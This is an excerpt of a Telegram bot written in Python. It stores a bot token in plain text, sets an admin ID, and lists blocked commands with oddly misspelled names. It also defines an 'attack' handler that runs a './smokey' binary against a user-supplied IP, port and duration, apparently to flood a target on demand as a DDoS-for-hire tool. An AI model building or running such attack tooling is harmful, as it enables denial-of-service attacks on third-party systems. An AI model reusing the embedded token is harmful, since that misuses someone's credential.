...
# Bot Configuration
TELEGRAM_BOT_TOKEN = '8094154182:AAFkWx4nYNujVscnwBeSWWh6yoqP5OcA1rQ'
ADMIN_USER_ID =  2007860433
...
PROTECTED_FILES = ["smokeay.py", "smodkey"]
BLOCKED_COMMANDS = ['nsha', 'vds', 'shutdoswn', 'reb4ot', 'rdm', 'mvd', 'dfd']
...
async def attack(update: Update, context: CallbackContext):
    ...
    if argument_type == 3:
        attack_command = f"./smokey {ip} {port} {duration} 1500"
